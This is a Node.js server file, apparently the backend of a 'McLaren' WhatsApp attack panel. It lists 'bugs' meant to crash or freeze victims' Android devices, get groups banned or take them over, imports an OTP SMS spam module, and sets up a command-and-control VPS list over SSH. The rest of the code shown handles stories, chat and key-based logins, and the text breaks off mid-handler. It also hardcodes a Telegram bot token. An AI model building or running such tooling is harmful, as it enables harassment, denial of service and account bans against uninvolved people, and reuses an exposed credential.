const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@bellachu/baileys');
const express = require("express");
const bodyParser = require('body-parser');
const readline = require("readline");
const crypto = require("crypto");
const cors = require('cors');
const app = express();

// IMPORTANT: body parsers must be registered before any POST route.
// The public chat routes are declared near the top of this file.
app.use(cors());
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.json({ limit: '100mb' }));

const { TelegramBot } = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const initServicesDP = require('./services_dp');
const initSetoran = require('./setoran');

// ========== IMPORT SPAM OTP (DITAMBAHKAN) ==========
const { spamOtp } = require('./spamOtpSms');

const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000;
const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "forclose_new", bug_name: "FORCLOSE NEW" }, 
  { bug_id: "delaymclaren", bug_name: "DELAY INVISBLE" },
  { bug_id: "delayhardmclaren", bug_name: "DELAY HARD" },
  { bug_id: "blankmclaren", bug_name: "BLANK ANDROID"},
  { bug_id: "frezemclaren", bug_name: "FREZEE HARD"},
  { bug_id: "forclosemclaren", bug_name: "FORCLOSE CLICK" },
  { bug_id: "delayhard", bug_mame: "DELAY HARD V2" },
  { bug_id: "delayxblank", bug_name: "DELAY X BLANK" },
  { bug_id: "fcbokep", bug_name: "FORCLOSE BOKEP" },
  { bug_id: "crashandro", bug_name: "CRASH ANDROID" }, 
  { bug_id: "band-group", bug_name: "BAN GB V1" },
  { bug_id: "banGb", bug_name: "BAN GB V2" },
  { bug_id: "kudet-group", bug_name: "KUDETA GROUP" }, 
  { bug_id: "blank-group", bug_name: "BLANK GROUP" }, 
  { bug_id: "delay-bug", bug_name: "DELAY GROUP" },
  { bug_id: "band-group2", bug_name: "BAND GB V3" }, 
  { bug_id: "mclarenfc", bug_name: "FC NO CLICK" },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// ========== PUBLIC CHAT ROOM ==========
// Standalone endpoint so it does not interfere with the existing private chat APIs.
const PUBLIC_CHAT_FILE = 'chat_room_public.json';
let publicChatList = [];

// WebSocket clients specifically connected to the public chat room.
const publicChatSockets = new Set();

if (fs.existsSync(PUBLIC_CHAT_FILE)) {
  try {
    publicChatList = JSON.parse(fs.readFileSync(PUBLIC_CHAT_FILE, 'utf8'));
    if (!Array.isArray(publicChatList)) publicChatList = [];
  } catch {
    publicChatList = [];
  }
}

function savePublicChat() {
  fs.writeFileSync(PUBLIC_CHAT_FILE, JSON.stringify(publicChatList, null, 2));
}

// ============================================================
// 📖 STORY SYSTEM — 24 JAM + IMAGE/VIDEO/TEXT + REAL-TIME
// ============================================================
const STORY_FILE = path.join(__dirname, 'stories.json');
const STORY_MEDIA_DIR = path.join(__dirname, 'story_media');
const STORY_TTL = 24 * 60 * 60 * 1000;
const STORY_MAX_IMAGE_BYTES = 12 * 1024 * 1024;
const STORY_MAX_VIDEO_BYTES = 70 * 1024 * 1024;
const storySockets = new Set();

if (!fs.existsSync(STORY_MEDIA_DIR)) {
  fs.mkdirSync(STORY_MEDIA_DIR, { recursive: true });
}
if (!fs.existsSync(STORY_FILE)) {
  fs.writeFileSync(STORY_FILE, '[]');
}

function loadStoriesRaw() {
  try {
    const parsed = JSON.parse(fs.readFileSync(STORY_FILE, 'utf8'));
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.error('[STORY] Gagal membaca stories.json:', err.message);
    return [];
  }
}

function saveStoriesRaw(stories) {
  const tmp = `${STORY_FILE}.tmp`;
  fs.writeFileSync(tmp, JSON.stringify(stories, null, 2));
  fs.renameSync(tmp, STORY_FILE);
}

function cleanExpiredStories() {
  const now = Date.now();
  let stories = loadStoriesRaw();
  const expired = stories.filter(s => Number(s.expiresAt) <= now);
  if (!expired.length) return stories;

  for (const story of expired) {
    if (story.type === 'photo' || story.type === 'video') {
      const fileName = story.mediaFile;
      if (fileName) {
        const filePath = path.join(STORY_MEDIA_DIR, path.basename(fileName));
        try { fs.unlinkSync(filePath); } catch (_) {}
      }
    }
  }
  stories = stories.filter(s => Number(s.expiresAt) > now);
  saveStoriesRaw(stories);
  return stories;
}

function storyPublicItem(story) {
  const now = Date.now();
  return {
    id: story.id,
    username: story.username,
    role: story.role || 'member',
    avatar: story.avatar || '',
    type: story.type,
    content: story.content || '',
    caption: story.caption || '',
    createdAt: Number(story.createdAt),
    expiresAt: Number(story.expiresAt),
    views: Array.isArray(story.views) ? story.views : [],
    viewCount: Array.isArray(story.views) ? story.views.length : 0,
    remainingMs: Math.max(0, Number(story.expiresAt) - now),
  };
}

function getStoryUsers() {
  const stories = cleanExpiredStories()
    .sort((a, b) => Number(a.createdAt) - Number(b.createdAt));

  const grouped = new Map();
  for (const story of stories) {
    if (!grouped.has(story.username)) {
      grouped.set(story.username, {
        username: story.username,
        role: story.role || 'member',
        avatar: story.avatar || '',
        stories: [],
      });
    }
    const user = grouped.get(story.username);
    user.role = story.role || user.role;
    user.avatar = story.avatar || user.avatar;
    user.stories.push(storyPublicItem(story));
  }
  return Array.from(grouped.values()).sort((a, b) => {
    const at = a.stories[a.stories.length - 1]?.createdAt || 0;
    const bt = b.stories[b.stories.length - 1]?.createdAt || 0;
    return bt - at;
  });
}

function broadcastStory(payload) {
  const message = JSON.stringify(payload);
  for (const ws of storySockets) {
    if (ws.readyState === 1) {
      try { ws.send(message); } catch (_) {}
    }
  }
}

// Static media files are intentionally public: stories are visible to all users.
app.use('/story-media', express.static(STORY_MEDIA_DIR, {
  fallthrough: false,
  maxAge: '1h',
}));

app.get('/api/story/list', (req, res) => {
  try {
    res.json({
      success: true,
      ttlMs: STORY_TTL,
      users: getStoryUsers(),
      serverTime: Date.now(),
    });
  } catch (err) {
    console.error('[STORY LIST]', err.message);
    res.status(500).json({ success: false, message: 'Gagal memuat story' });
  }
});

app.post('/api/story/create', (req, res) => {
  try {
    const {
      username,
      role,
      avatar,
      type = 'text',
      content,
      caption = '',
      session_key,
    } = req.body || {};

    const cleanUsername = sanitizePublicChat(username);
    const cleanRole = sanitizePublicChat(role || 'member');
    const cleanCaption = String(caption ?? '').trim().slice(0, 1000);
    const storyType = String(type).toLowerCase();

    if (!cleanUsername || !session_key) {
      return res.status(400).json({ success: false, message: 'username dan session_key wajib diisi' });
    }

    const keyInfo = activeKeys[session_key];
    if (!keyInfo || keyInfo.username !== cleanUsername) {
      return res.status(401).json({ success: false, message: 'Session tidak valid' });
    }

    if (!['text', 'photo', 'video'].includes(storyType)) {
      return res.status(400).json({ success: false, message: 'Tipe story tidak valid' });
    }

    const rawContent = String(content ?? '');
    if (!rawContent.trim()) {
      return res.status(400).json({ success: false, message: 'Isi story wajib diisi' });
    }

    const now = Date.now();
    const story = {
      id: crypto.randomUUID ? crypto.randomUUID() : `${now}-${crypto.randomBytes(8).toString('hex')}`,
      username: cleanUsername,
      role: cleanRole || 'member',
      avatar: String(avatar || ''),
      type: storyType,
      content: '',
      caption: cleanCaption,
      createdAt: now,
      expiresAt: now + STORY_TTL,
      views: [],
      mediaFile: '',
    };

    if (storyType === 'text') {
      story.content = rawContent.slice(0, 5000);
    } else {
      const match = rawContent.match(/^data:(image\/(?:jpeg|jpg|png|webp|gif)|video\/(?:mp4|webm|quicktime));base64,([A-Za-z0-9+/=\r\n]+)$/i);
      if (!match) {
        return res.status(400).json({
          success: false,
          message: 'Media harus dikirim sebagai data URL base64 yang valid',
        });
      }

      const mime = match[1].toLowerCase().replace('jpg', 'jpeg');
      const buffer = Buffer.from(match[2].replace(/\s/g, ''), 'base64');
      const isVideo = mime.startsWith('video/');
      const maxBytes = isVideo ? STORY_MAX_VIDEO_BYTES : STORY_MAX_IMAGE_BYTES;

      if (!buffer.length) {
        return res.status(400).json({ success: false, message: 'File media kosong' });
      }
      if (buffer.length > maxBytes) {
        return res.status(413).json({
          success: false,
          message: `Ukuran ${isVideo ? 'video' : 'foto'} terlalu besar`,
          maxBytes,
        });
      }

      const extMap = {
        'image/jpeg': 'jpg',
        'image/png': 'png',
        'image/webp': 'webp',
        'image/gif': 'gif',
        'video/mp4': 'mp4',
        'video/webm': 'webm',
        'video/quicktime': 'mov',
      };
      const ext = extMap[mime];
      if (!ext) {
        return res.status(400).json({ success: false, message: 'Format media tidak didukung' });
      }

      const fileName = `${story.id}.${ext}`;
      const filePath = path.join(STORY_MEDIA_DIR, fileName);
      fs.writeFileSync(filePath, buffer);
      story.mediaFile = fileName;
      story.content = `${req.protocol}://${req.get('host')}/story-media/${encodeURIComponent(fileName)}`;
    }

    const stories = cleanExpiredStories();
    stories.push(story);
    saveStoriesRaw(stories);

    const publicStory = storyPublicItem(story);
    broadcastStory({ type: 'story_created', story: publicStory });

    res.status(201).json({
      success: true,
      story: publicStory,
      expiresAt: story.expiresAt,
    });
  } catch (err) {
    console.error('[STORY CREATE]', err);
    res.status(500).json({ success: false, message: 'Gagal membuat story' });
  }
});

app.post('/api/story/view', (req, res) => {
  try {
    const storyId = String(req.body?.story_id || '');
    const viewer = sanitizePublicChat(req.body?.viewer || '');
    if (!storyId || !viewer) {
      return res.status(400).json({ success: false, message: 'story_id dan viewer wajib diisi' });
    }

    const stories = cleanExpiredStories();
    const story = stories.find(s => s.id === storyId);
    if (!story) return res.status(404).json({ success: false, message: 'Story tidak ditemukan atau sudah expired' });

    if (!Array.isArray(story.views)) story.views = [];
    if (!story.views.includes(viewer)) story.views.push(viewer);
    saveStoriesRaw(stories);

    res.json({ success: true, viewCount: story.views.length });
  } catch (err) {
    console.error('[STORY VIEW]', err.message);
    res.status(500).json({ success: false, message: 'Gagal mencatat view' });
  }
});

app.post('/api/story/delete', (req, res) => {
  try {
    const { story_id, username, session_key } = req.body || {};
    const cleanUsername = sanitizePublicChat(username);
    if (!story_id || !cleanUsername || !session_key) {
      return res.status(400).json({ success: false, message: 'Data tidak lengkap' });
    }

    const keyInfo = activeKeys[session_key];
    if (!keyInfo || keyInfo.username !== cleanUsername) {
      return res.status(401).json({ success: false, message: 'Session tidak valid' });
    }

    const stories = cleanExpiredStories();
    const index = stories.findIndex(s => s.id === String(story_id));
    if (index === -1) return res.status(404).json({ success: false, message: 'Story tidak ditemukan' });

    if (stories[index].username !== cleanUsername) {
      return res.status(403).json({ success: false, message: 'Bukan pemilik story' });
    }

    const [removed] = stories.splice(index, 1);
    if (removed?.mediaFile) {
      try { fs.unlinkSync(path.join(STORY_MEDIA_DIR, path.basename(removed.mediaFile))); } catch (_) {}
    }
    saveStoriesRaw(stories);
    broadcastStory({ type: 'story_deleted', story_id: String(story_id), username: cleanUsername });

    res.json({ success: true, message: 'Story dihapus' });
  } catch (err) {
    console.error('[STORY DELETE]', err.message);
    res.status(500).json({ success: false, message: 'Gagal menghapus story' });
  }
});

// Bersihkan story expired secara otomatis tanpa mengganggu request lain.
setInterval(() => {
  try {
    const before = loadStoriesRaw().length;
    const after = cleanExpiredStories().length;
    if (before !== after) {
      broadcastStory({ type: 'stories_expired', serverTime: Date.now() });
    }
  } catch (err) {
    console.error('[STORY CLEANUP]', err.message);
  }
}, 60 * 1000).unref?.();

function sanitizePublicChat(input) {
  return String(input ?? '')
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .trim()
    .slice(0, 250);
}

// GET: /chat_room_public
app.get("/chat_room_public", (req, res) => {
  try {
    res.json(publicChatList);
  } catch (err) {
    console.error("[PUBLIC CHAT] GET error:", err.message);
    res.status(500).json({ success: false, message: "Gagal memuat chat public" });
  }
});

// POST: /chat_room_public
// Body: { "from": "username", "message": "pesan" }
app.post("/chat_room_public", (req, res) => {
  try {
    const from = sanitizePublicChat(req.body?.from);
    const message = sanitizePublicChat(req.body?.message);

    if (!from || !message) {
      return res.status(400).json({
        success: false,
        message: "from dan message wajib diisi"
      });
    }

    const chat = {
      id: crypto.randomUUID ? crypto.randomUUID() : `${Date.now()}-${crypto.randomBytes(6).toString('hex')}`,
      from,
      username: from,
      role: "member",
      text: message,
      message,
      time: Date.now(),
      timestamp: Date.now(),
      createdAt: new Date().toISOString(),
      imageUrl: "",
      reactions: {},
      status: "terkirim"
    };

    publicChatList.push(chat);

    // Keep the public room bounded so the JSON file cannot grow forever.
    if (publicChatList.length > 1000) {
      publicChatList = publicChatList.slice(-1000);
    }

    savePublicChat();
    broadcastPublicChat(chat);
    res.status(200).json({ success: true, message: chat, data: chat });
  } catch (err) {
    console.error("[PUBLIC CHAT] POST error:", err.message);
    res.status(500).json({ success: false, message: "Gagal mengirim pesan" });
  }
});

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

// ============================================================
// TELEGRAM — SINGLE SOURCE OF CONFIG
// Tidak menggunakan config.js dan tidak menggunakan .env.
// Isi token bot langsung di baris BOT_TOKEN di file ini.
// ============================================================
const BOT_TOKEN = "8928534275:AAHe28NHdLTgGyLnUI56AhjcxfGntF-_Lw8";
const CHANNEL_1 = "@Mclareninfo";
const CHANNEL_2 = "@BulkStar";

if (!BOT_TOKEN || BOT_TOKEN === "8928534275:AAHe28NHdLTgGyLnUI56AhjcxfGntF-_Lw8") {
}

const TOKEN = BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, {
  polling: {
    interval: 300,
    autoStart: true,
    params: { timeout: 10 }
  }
});

// ─── HANDLE 409 CONFLICT (multi-instance) ─────────────────
bot.on('polling_error', (error) => {
  const msg = String(error?.message || '');
  if (msg.includes('409') || msg.includes('Conflict')) {
    console.log('[BOT] ⚠️ 409 CONFLICT — Ada bot instance lain yang jalan!');
    console.log('[BOT] 💡 Solusi: Matikan semua instance lain & restart.');
    // Jangan crash — biarkan retry otomatis
    return;
  }
  console.log('[BOT] Polling error:', msg);
});

bot.on('error', (error) => {
  console.log('[BOT] Error:', error?.message || error);
});

// ============================================================
// 🆕 SETORAN — LAZY INITIALIZER
// ============================================================
let __setoran = null;
function getSetoran() {
  if (__setoran) return __setoran;
  try {
    __setoran = initSetoran(bot, {
      ADMIN_GROUP_ID,
      CHANNEL_ID: CHANNEL_1,
      INFORMATION_URL: "https://t.me/Mclareninfo"
    });
    if (typeof sendMainMenu === 'function') {
      __setoran.setMainMenuSender(sendMainMenu);
    }
    console.log('[SETORAN] Module initialized ✅');
  } catch (e) {
    console.error('[SETORAN] Failed init:', e.message);
    __setoran = null;
  }
  return __setoran;
}

// ============================================================
// 🆕 SERVICES DP — LAZY INITIALIZER
// Tidak dipanggil di top-level biar tidak kena TDZ error
// ============================================================
let __servicesDP = null;
function getServicesDP() {
  if (__servicesDP) return __servicesDP;
  try {
    __servicesDP = initServicesDP(bot, {
      loadDatabase,
      saveDatabase,
      activeKeys,
      telegramIsOwner,
      telegramCanCreate,
      ADMIN_GROUP_ID,
      CHANNEL_ID: CHANNEL_1,
      INFORMATION_URL: "https://t.me/Mclareninfo",
      QRIS_IMAGE_URL: "https://files.catbox.moe/ycl8sk.jpg"
    });
    if (typeof sendMainMenu === 'function') {
      __servicesDP.setMainMenuSender(sendMainMenu);
    }
    console.log('[SVC] Services DP initialized ✅');
  } catch (e) {
    console.error('[SVC] Failed init Services DP:', e.message);
    __servicesDP = null;
  }
  return __servicesDP;
}

/**
 * Native Telegram RichMessage layer.
 * UI code below MUST call bot.sendRichMessage()/bot.sendRichMessageDraft().
 * Transport uses the RichMessage methods provided by node-telegram-bot-api 1.2.x.
 */
class HTML {
  constructor(value = "") { this.value = String(value); }
  static escape(value) {
    return String(value ?? "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }
  static italic(value) { return `<i>${value}</i>`; }
  static customEmoji(id, fallback = "") {
    return `<tg-emoji emoji-id="${String(id)}">${HTML.escape(fallback)}</tg-emoji>`;
  }
  italic(value) { this.value = `<i>${value}</i>`; return this; }
  thinking(value) { this.value = `<tg-thinking>${value}</tg-thinking>`; return this; }
  build() { return this.value; }
}

function __richInput(content) {
  if (content && typeof content === "object" && content.build instanceof Function) {
    return { html: content.build() };
  }
  if (typeof content === "object" && content !== null && !Array.isArray(content)) {
    if (content.html || content.markdown || content.blocks) return content;
  }
  return { html: String(content ?? "") };
}

function __richButtonStyle(button, position = 0) {
  if (!button || typeof button !== "object") return button;
  const copy = { ...button };
  const allowed = new Set(["primary", "danger", "success"]);
  if (allowed.has(copy.style)) return copy;

  const text = String(copy.text || "").toLowerCase();
  const callback = String(copy.callback_data || "").toLowerCase();

  // Keep destructive actions red and positive/confirmation actions green.
  if (/hapus|delete|remove|tolak|reject|cancel|batal|danger|reject_|rej_/.test(text + " " + callback)) {
    copy.style = "danger";
  } else if (/acc|approve|confirm|konfirmasi|berhasil|success|create|buat|join|cek join|lanjut|play|buy|beli|add|tambah/.test(text + " " + callback)) {
    copy.style = "success";
  } else {
    copy.style = ["primary", "success", "danger"][position % 3];
  }
  return copy;
}

function __styleRichKeyboard(inlineKeyboard) {
  if (!Array.isArray(inlineKeyboard)) return inlineKeyboard;
  let position = 0;
  return inlineKeyboard.map(row => Array.isArray(row) ? row.map(button => {
    const styled = __richButtonStyle(button, position++);
    return styled;
  }) : row);
}

function __richForm(options = {}) {
  const form = { ...options };
  // These belong to legacy sendMessage/media methods, not native sendRichMessage.
  delete form.parse_mode;
  delete form.supports_streaming;
  delete form.editType;
  if (form.reply_markup && typeof form.reply_markup !== "string") {
    form.reply_markup = { ...form.reply_markup };
    if (Array.isArray(form.reply_markup.inline_keyboard)) {
      // Preserve RichMessage button styles so primary/danger/success render as
      // their native colored button variants. Missing styles are assigned safely.
      form.reply_markup.inline_keyboard = __styleRichKeyboard(form.reply_markup.inline_keyboard);
    }
  }
  return form;
}

const __packageNativeSendRichMessage = bot.sendRichMessage.bind(bot);
const __packageNativeSendRichMessageDraft = bot.sendRichMessageDraft.bind(bot);

// Public method always delegates to the package's native RichMessage API.
bot.sendRichMessage = async (targetOrPayload, content, options = {}) => {
  if (targetOrPayload && typeof targetOrPayload === "object" && targetOrPayload.type) {
    const p = targetOrPayload;
    const opts = __richForm(p.options || {});
    const media = HTML.escape(p.media || "");
    const caption = p.options?.caption ? String(p.options.caption) : "";
    let tag = "";
    if (p.type === "video") tag = `<video src="${media}"/>`;
    else if (p.type === "photo") tag = `<img src="${media}"/>`;
    else if (p.type === "audio") tag = `<audio src="${media}"/>`;
    return __packageNativeSendRichMessage(p.chatId, { html: `${tag}${caption}` }, opts);
  }
  return __packageNativeSendRichMessage(targetOrPayload, __richInput(content), __richForm(options));
};

bot.sendRichMessageDraft = async (chatId, draftId, content, options = {}) => {
  return __packageNativeSendRichMessageDraft(chatId, draftId, __richInput(content), __richForm(options));
};

bot.editRichMessage = async (content, options = {}) => {
  const chatId = options.chat_id ?? options.chatId;
  const messageId = options.message_id ?? options.messageId;
  if (chatId !== undefined && messageId !== undefined) {
    await bot.deleteMessage(chatId, messageId).catch(() => {});
  }
  const clean = { ...options };
  delete clean.chat_id;
  delete clean.chatId;
  delete clean.message_id;
  delete clean.messageId;
  return bot.sendRichMessage(chatId, content, clean);
};

const __draftLocks = new Map();
async function runRichLoading(chatId) {
  if (Number(chatId) < 0) return;
  if (__draftLocks.has(Number(chatId))) return;
  __draftLocks.set(Number(chatId), true);
  try {
    const draftId = Math.floor(Math.random() * 2147483646) + 1;
    const steps = [
      `${HTML.customEmoji("6098230596788556786", "🕐")} Initializing 𝙈𝘾𝙇𝘼𝙍𝙀𝙉...`,
      `${HTML.customEmoji("5402355073458123173", "📡")} Connecting Telegram...`,
      `${HTML.customEmoji("6046530293035176435", "🛡️")} Loading Security Module...`,
      `${HTML.customEmoji("5992087137267225105", "📦")} Loading Resources...`,
      `${HTML.customEmoji("5411430859045626151", "👑")} Preparing Rich Menu...`,
      `${HTML.customEmoji("6269243378332864932", "✅")} Done!`
    ];
    for (const step of steps) {
      await bot.sendRichMessageDraft(
        chatId,
        draftId,
        new HTML().thinking(HTML.italic(step)).build()
      ).catch(err => console.error("[RICH DRAFT]", err?.message || err));
      await new Promise(resolve => setTimeout(resolve, 650));
    }
  } finally {
    __draftLocks.delete(Number(chatId));
  }
}

const __lastRichMenu = new Map();
async function deletePreviousRichMenu(chatId) {
  const previous = __lastRichMenu.get(Number(chatId));
  if (!previous?.message_id) return;
  await bot.deleteMessage(chatId, previous.message_id).catch(() => {});
  __lastRichMenu.delete(Number(chatId));
}

bot.sendAnimatedRichMessage = async (chatId, content, options = {}) => {
  await deletePreviousRichMenu(chatId);
  await runRichLoading(chatId);
  const sent = await bot.sendRichMessage(chatId, content, options);
  if (sent?.message_id) __lastRichMenu.set(Number(chatId), sent);
  return sent;
};


async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    if (!fs.existsSync(SESSION_PATH)) {
      console.log(" Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}

const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

const onlineUsers = new Set();

wss.on('connection', function (ws, req) {
  let username;

  const requestUrl = String(req?.url || '');
  const isPublicChatSocket = requestUrl.split('?')[0] === '/ws/chat';
  const isStorySocket = requestUrl.split('?')[0] === '/ws/story';

  if (isStorySocket) {
    storySockets.add(ws);
    try {
      ws.send(JSON.stringify({
        type: 'stories_snapshot',
        users: getStoryUsers(),
        serverTime: Date.now(),
      }));
    } catch (_) {}
  }

  if (isPublicChatSocket) {
    publicChatSockets.add(ws);

    // Send the latest room messages immediately so the Flutter client
    // does not have to wait for the next polling cycle.
    try {
      ws.send(JSON.stringify({
        type: 'history',
        messages: publicChatList.slice(-80)
      }));
    } catch (_) {}
  }

  function broadcastStats() {
    const stats = JSON.stringify({
      type: 'stats',
      onlineUsers: onlineUsers.size,
      activeConnections: wss.clients.size,
    });
    wss.clients.forEach((client) => {
      if (client.readyState === 1) {
        client.send(stats);
      }
    });
  }

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'stats') {
        broadcastStats();
      }

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        const userInfo = session.find(e => e.sessionKey === data.key);
        ws.username = userInfo?.username || data.key;
        onlineUsers.add(ws.username);
        broadcastStats();

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: userInfo?.username,
          androidId: userInfo?.androidId,
          role: userInfo?.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            clearInterval(interval);
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            clearInterval(interval);
            return ws.close();
          }

        }, 10000);

        ws.interval = interval;
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
